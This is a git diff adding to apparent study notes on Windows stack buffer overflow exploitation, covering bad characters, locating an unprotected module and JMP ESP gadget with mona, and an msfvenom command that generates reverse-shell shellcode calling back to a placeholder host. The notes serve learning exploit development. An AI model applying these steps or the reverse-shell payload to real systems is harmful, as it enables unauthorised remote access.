@@ -74,3 +74,15 @@
 			    sys.exit()
 		- Inside the offset we add the string and the output will tell you the offset 
 		- e.g., "Exact match at offset 2003". This means the first 2003 bytes of your buffer go to the stack, and the next 4 bytes overwrite the EIP.
+## Finding Bad Characters
+- Bad characters are bytes that interfere with your exploit, causing it to fail. The most common bad character is the **null byte** (`\x00`), which in C programming acts as a string terminator—anything after a null byte gets cut off.
+
+## Finding the Right Module
+- Even after gaining control of EIP, you need a reliable way to redirect execution to your shellcode. Since memory addresses change between program runs (due to ASLR), you need to find a **fixed address** within a module. The right module has no memory protections like **ASLR** or SafeSEH.
+	- steps:
+		!mona modules
+		!mona find -s "\xff\xe4" -m <module_name.dll>
+		!mona jmp -r esp -cpb "\x00\x0a\x0d"
+
+
+msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -b "\x00\x0a\x0d" -f c
